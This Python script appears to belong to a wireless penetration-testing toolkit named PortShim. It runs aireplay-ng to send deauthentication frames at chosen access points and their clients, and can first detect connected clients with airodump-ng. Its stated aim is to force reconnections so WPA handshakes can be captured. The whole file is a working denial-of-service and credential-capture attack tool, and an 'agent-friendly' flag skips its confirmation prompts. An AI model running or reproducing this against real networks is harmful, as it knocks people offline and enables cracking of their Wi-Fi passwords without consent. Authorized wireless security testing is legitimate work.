#!/usr/bin/env python3
"""
PortShim Wireless — client deauthentication (aireplay-ng).

Sends deauthentication frames to disconnect clients from target access
points, forcing them to reconnect and potentially re-authenticate
(producing WPA handshakes for capture).

Usage:
    python scripts/wireless_deauth.py                                   # Latest targets, interactive
    python scripts/wireless_deauth.py --targets-file <path>              # Specific targets
    python scripts/wireless_deauth.py --count 10                        # Send 10 frames per target
    python scripts/wireless_deauth.py --detect-clients                  # Discover clients before deauth
    python scripts/wireless_deauth.py --force                           # Agent-friendly (skip prompts)
    python scripts/wireless_deauth.py --dry-run                         # Show plan only

Output:
    outputs/wireless/deauth-result-{timestamp}.json
    Terminal report of deauth results.
"""

import argparse
import csv
import json
import os
import re
import shutil
import signal
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from scripts.wireless_hardware import (
    detect_interfaces,
    enable_monitor_mode,
    restore_managed_mode,
)

OUTPUT_DIR = PROJECT_ROOT / "outputs" / "wireless"

# ── Colours ──
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"


def status(msg, ok=True):
    symbol = f"{GREEN}\u2713{RESET}" if ok else f"{RED}\u2717{RESET}"
    print(f"  {symbol} {msg}")


def warn(msg):
    print(f"  {YELLOW}\u26a0 {msg}{RESET}")


def header(msg):
    box = "\u2550"
    pad = max(0, 54 - len(msg))
    print(f"\n{BOLD}{CYAN}\u2550\u2550\u2550 {msg} {RESET}{box * pad}")


def info(msg):
    print(f"   {DIM}{msg}{RESET}")


# ── File helpers ──


def find_latest_targets() -> Path | None:
    """Find the most recent targets-*.json file in the output directory."""
    if not OUTPUT_DIR.exists():
        return None
    files = sorted(OUTPUT_DIR.glob("targets-*.json"), reverse=True)
    return files[0] if files else None


def load_targets(file_path: Path) -> list[dict]:
    """Load and validate a targets JSON file."""
    with open(file_path) as f:
        data = json.load(f)
    targets = data.get("targets", [])
    if not targets:
        status("No targets in selection file", False)
        sys.exit(1)
    return targets


# ── Client detection ──


def detect_clients_on_ap(iface: str, bssid: str, duration: int = 10) -> list[str]:
    """
    Run a quick airodump-ng to detect clients associated with a target AP.
    Returns list of client MAC addresses.
    """
    if not shutil.which("airodump-ng"):
        return []

    tmp_dir = Path("/tmp")
    output_prefix = str(tmp_dir / f"airodump-tmp")

    cmd = [
        "airodump-ng",
        iface,
        "--bssid", bssid,
        "-w", output_prefix,
        "--output-format", "csv",
        "--write-interval", "1",
    ]

    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid,
    )

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        proc.wait(timeout=5)

    # Parse the CSV for station MACs associated with the target BSSID
    csv_path = tmp_dir / f"airodump-tmp-01.csv"
    clients = []

    if csv_path.exists():
        content = csv_path.read_text()
        try:
            # airodump-ng CSV has two sections separated by a blank line:
            #   AP section (BSSID header) → blank line → Station section (Station MAC header)
            sections = content.strip().split("\n\n")
            if len(sections) < 2:
                return clients  # no station section
            station_section = sections[1].strip().split("\n")
            if len(station_section) < 2:
                return clients
            reader = csv.DictReader(station_section)
            for row in reader:
                # Strip leading spaces from CSV header field names
                r = {k.strip(): v for k, v in row.items()}
                if r.get("BSSID", "").strip().upper() == bssid.upper():
                    mac = r.get("Station MAC", "").strip()
                    if mac and re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", mac):
                        clients.append(mac.upper())
        except Exception:
            pass

    # Cleanup temp files
    for f in tmp_dir.glob("airodump-tmp*"):
        try:
            f.unlink()
        except OSError:
            pass

    return clients


# ── Deauth ──


def send_deauth(
    iface: str,
    bssid: str,
    count: int = 5,
    client: str | None = None,
) -> dict:
    """
    Send deauthentication frames using aireplay-ng.
    Returns dict with success status and frame count.
    """
    if not shutil.which("aireplay-ng"):
        return {
            "success": False,
            "error": "aireplay-ng not found (install aircrack-ng)",
            "bssid": bssid,
            "count": count,
        }

    cmd = [
        "aireplay-ng",
        "-0", str(count),
        "-a", bssid,
    ]
    if client:
        cmd.extend(["-c", client])
    cmd.append(iface)

    info(f"Running: {' '.join(cmd)}")

    try:
        result = subprocess.run(
            cmd,
            capture_output=True, text=True,
            timeout=30,
        )
    except subprocess.TimeoutExpired:
        return {
            "success": False,
            "error": "aireplay-ng timed out",
            "bssid": bssid,
            "count": count,
        }

    # Parse frames sent from stderr
    frames_sent = 0
    for line in result.stderr.splitlines():
        if "Sending DeAuth" in line:
            frames_sent += 1

    return {
        "success": True,
        "bssid": bssid,
        "client": client,
        "count": count,
        "frames_sent": frames_sent or count,  # best guess if parsing failed
        "exit_code": result.returncode,
    }


# ── Orchestration ──


def deauth_targets(
    iface: str,
    targets: list[dict],
    count: int = 5,
    detect_clients: bool = False,
) -> dict:
    """
    Run deauth against all targets.
    Handles monitor mode setup/teardown.
    Returns aggregate result dict.
    """
    enable_monitor_mode(iface)

    total_clients_detected = 0
    results = []
    skipped = 0

    try:
        for target in targets:
            bssid = target.get("bssid")
            if not bssid:
                skipped += 1
                continue

            ssid = target.get("ssid", "(hidden)")
            print()
            header(f"Deauth: {ssid} ({bssid})")

            client_mac = None
            if detect_clients:
                info(f"Scanning for clients on {bssid}...")
                clients = detect_clients_on_ap(iface, bssid)
                if clients:
                    total_clients_detected += len(clients)
                    info(f"Found {len(clients)} client(s): {', '.join(clients)}")
                    client_mac = clients[0]  # deauth the first client
                else:
                    info("No clients detected, sending broadcast deauth")

            result = send_deauth(
                iface=iface,
                bssid=bssid,
                count=count,
                client=client_mac,
            )
            results.append(result)

            symbol = f"{GREEN}\u2713{RESET}" if result["success"] else f"{RED}\u2717{RESET}"
            print(f"  {symbol} {result.get('frames_sent', count)} frames sent")

    finally:
        restore_managed_mode(iface)

    successful = sum(1 for r in results if r.get("success"))

    return {
        "interface": iface,
        "total_targets": len(targets),
        "total_successful": successful,
        "total_skipped": skipped,
        "total_clients_detected": total_clients_detected,
        "duration": count * len(targets),  # rough estimate
        "results": results,
    }


# ── Reporting ──


def save_deauth_result(result: dict, output_dir: Path):
    """Save structured deauth result as JSON."""
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")

    output = {
        "deauth_metadata": {
            "timestamp": timestamp,
            "interface": result["interface"],
            "total_targets": result["total_targets"],
            "total_successful": result["total_successful"],
            "total_skipped": result["total_skipped"],
            "total_clients_detected": result["total_clients_detected"],
            "duration": result["duration"],
        },
        "results": result["results"],
    }

    json_path = output_dir / f"deauth-result-{timestamp}.json"
    with open(json_path, "w") as f:
        json.dump(output, f, indent=2)

    print(f"\n  Results saved: {json_path}")
    return json_path


def print_deauth_report(result: dict):
    """Print a formatted deauth result report to terminal."""
    header("Deauth Results")

    total = result["total_targets"]
    successful = result["total_successful"]
    skipped = result["total_skipped"]

    print(f"  {BOLD}{successful}/{total}{RESET} targets successful"
          f"{f' ({skipped} skipped)' if skipped else ''}")

    if result["total_clients_detected"]:
        print(f"  {GREEN}{result['total_clients_detected']}{RESET} client(s) detected")

    for r in result["results"]:
        if r.get("success"):
            bssid = r.get("bssid", "?")
            frames = r.get("frames_sent", "?")
            client = r.get("client")
            client_str = f" → client {client}" if client else ""
            print(f"  {GREEN}\u2713{RESET} {bssid}: {frames} frames sent{client_str}")
        else:
            bssid = r.get("bssid", "?")
            error = r.get("error", "unknown error")
            print(f"  {RED}\u2717{RESET} {bssid}: failed ({error})")


# ── Signal handler ──


def signal_handler(sig, frame):
    print(f"\n  {YELLOW}Deauth interrupted by user.{RESET}")
    sys.exit(130)


# ── Main ──


def main():
    parser = argparse.ArgumentParser(
        description="PortShim Wireless — client deauthentication (aireplay-ng)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--targets-file", default=None,
        help="Target selection JSON file (default: most recent in outputs/wireless/)",
    )
    parser.add_argument(
        "--interface", default=None,
        help="Wireless interface (auto-detect if not specified)",
    )
    parser.add_argument(
        "--count", type=int, default=5,
        help="Number of deauth frames per target (default: 5)",
    )
    parser.add_argument(
        "--detect-clients", action="store_true",
        help="Scan for associated clients before deauth (adds ~10s per target)",
    )
    parser.add_argument(
        "--force", action="store_true",
        help="Agent-friendly: skip recommendations/prompts",
    )
    parser.add_argument(
        "--output-dir", default=None,
        help="Output directory (default: outputs/wireless/)",
    )
    parser.add_argument(
        "--dry-run", action="store_true",
        help="Show plan without sending deauth frames",
    )

    args = parser.parse_args()

    signal.signal(signal.SIGINT, signal_handler)

    # ── Load targets ──
    target_path = args.targets_file
    if not target_path:
        latest = find_latest_targets()
        if not latest:
            status("No target selection found", False)
            print(f"  Run '{CYAN}portshim wireless select{RESET}' first or specify --targets-file")
            sys.exit(1)
        target_path = latest

    target_file = Path(target_path)
    if not target_file.exists():
        status(f"Targets file not found: {target_file}", False)
        sys.exit(1)

    targets = load_targets(target_file)

    # ── Output dir ──
    output_dir = Path(args.output_dir) if args.output_dir else OUTPUT_DIR
    output_dir.mkdir(parents=True, exist_ok=True)

    # ── Interface ──
    iface = args.interface
    if not iface:
        interfaces = detect_interfaces()
        if not interfaces:
            status("No wireless interfaces found", False)
            sys.exit(1)
        iface = interfaces[0]
        info(f"Using interface: {iface}")

    # ── Check tools ──
    if not shutil.which("aireplay-ng"):
        status("aireplay-ng not found", False)
        print("  Install: sudo pacman -S aircrack-ng")
        sys.exit(1)

    print(f"\n{BOLD}{RED}\u2666 {RESET}{BOLD}PORTSHIM{RESET} {BOLD}WIRELESS{RESET} {RED}\u2666{RESET}")
    print(f"{CYAN}Client deauthentication{RESET}\n")

    status(f"Targets:  {len(targets)}")
    status(f"Interface: {iface}")
    status(f"Frames:   {args.count} per target")
    status(f"Clients:  {'detect' if args.detect_clients else 'broadcast (all)'}")

    # ── Dry run ──
    if args.dry_run:
        print()
        header("Dry Run")
        for t in targets:
            bssid = t.get("bssid", "(no BSSID)")
            ssid = t.get("ssid", "(hidden)")
            print(f"  Would deauth {ssid} ({bssid}) with {args.count} frames")
        return

    # ── Execute ──
    result = deauth_targets(iface, targets, args.count, args.detect_clients)
    print()
    print_deauth_report(result)
    save_deauth_result(result, output_dir)


if __name__ == "__main__":
    main()
